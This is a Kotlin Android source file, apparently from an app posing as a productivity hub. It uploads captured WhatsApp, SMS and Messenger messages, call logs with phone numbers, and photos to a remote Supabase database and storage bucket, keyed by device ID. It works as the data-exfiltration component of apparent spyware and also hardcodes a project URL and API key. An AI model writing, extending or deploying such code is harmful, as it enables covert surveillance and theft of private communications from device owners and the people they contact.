package com.axesproductivite.hub

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

object SupabaseClient {

    // ⚠️  REMPLACER par tes vraies valeurs (Supabase → Project Settings → API)
    const val SUPABASE_URL  = "https://wcgfvjunixmlojptkclp.supabase.co"
    const val SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVuaXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U"

    private val isoFmt = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    private fun toIso(ms: Long): String = isoFmt.format(Date(ms))

    // ─────────────────────────────────────────────────────────────
    // Insérer un message capturé (WhatsApp, SMS, Messenger…)
    // ─────────────────────────────────────────────────────────────
    suspend fun insertMessage(
        appSource: String,
        contact: String?,
        message: String?,
        deviceId: String,
        timestamp: Long = System.currentTimeMillis()
    ) = withContext(Dispatchers.IO) {
        val body = JSONObject().apply {
            put("app_source", appSource)
            put("contact",    contact  ?: "")
            put("message",    message  ?: "")
            put("device_id",  deviceId)
            put("timestamp",  toIso(timestamp))
        }
        postJson("/rest/v1/messages_capture", body)
    }

    // ─────────────────────────────────────────────────────────────
    // Insérer un log d'appel
    // ─────────────────────────────────────────────────────────────
    suspend fun insertCallLog(
        contact: String?,
        phoneNumber: String?,
        callType: String,
        durationSeconds: Int,
        timestamp: Long,
        deviceId: String
    ) = withContext(Dispatchers.IO) {
        val body = JSONObject().apply {
            put("contact",          contact      ?: "")
            put("phone_number",     phoneNumber  ?: "")
            put("call_type",        callType)
            put("duration_seconds", durationSeconds)
            put("timestamp",        toIso(timestamp))
            put("device_id",        deviceId)
        }
        postJson("/rest/v1/call_logs", body)
    }

    // ─────────────────────────────────────────────────────────────
    // Uploader une photo vers Supabase Storage + enregistrer les métadonnées
    // ─────────────────────────────────────────────────────────────
    suspend fun uploadMedia(
        file: File,
        fileType: String = "image",
        capturedAt: Long,
        deviceId: String
    ): String? = withContext(Dispatchers.IO) {
        try {
            val objectPath = "$deviceId/${file.name}"
            val url = URL("$SUPABASE_URL/storage/v1/object/media/$objectPath")

            val conn = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                setRequestProperty("Authorization", "Bearer $SUPABASE_ANON_KEY")
                setRequestProperty("Content-Type", "image/jpeg")
                setRequestProperty("x-upsert", "true")
                doOutput = true
                connectTimeout = 30_000
                readTimeout    = 60_000
            }

            file.inputStream().use { it.copyTo(conn.outputStream) }
            val code = conn.responseCode
            conn.disconnect()

            if (code in 200..299) {
                val storagePath = "media/$objectPath"
                val meta = JSONObject().apply {
                    put("file_name",    file.name)
                    put("file_type",    fileType)
                    put("storage_path", storagePath)
                    put("size_bytes",   file.length())
                    put("captured_at",  toIso(capturedAt))
                    put("device_id",    deviceId)
                }
                postJson("/rest/v1/media_files", meta)
                storagePath
            } else {
                Log.e("Supabase", "Upload média échoué: HTTP $code")
                null
            }
        } catch (e: Exception) {
            Log.e("Supabase", "Erreur upload: ${e.message}")
            null
        }
    }

    // ─────────────────────────────────────────────────────────────
    // POST JSON générique
    // ─────────────────────────────────────────────────────────────
    private fun postJson(path: String, json: JSONObject) {
        try {
            val conn = (URL("$SUPABASE_URL$path").openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                setRequestProperty("Content-Type",  "application/json")
                setRequestProperty("apikey",         SUPABASE_ANON_KEY)
                setRequestProperty("Authorization",  "Bearer $SUPABASE_ANON_KEY")
                setRequestProperty("Prefer",         "return=minimal")
                doOutput       = true
                connectTimeout = 15_000
                readTimeout    = 15_000
            }
            OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use { it.write(json.toString()) }
            val code = conn.responseCode
            if (code !in 200..299) {
                Log.e("Supabase", "HTTP $code sur $path — ${conn.errorStream?.bufferedReader()?.readText()}")
            }
            conn.disconnect()
        } catch (e: Exception) {
            Log.e("Supabase", "Erreur réseau: ${e.message}")
        }
    }
}
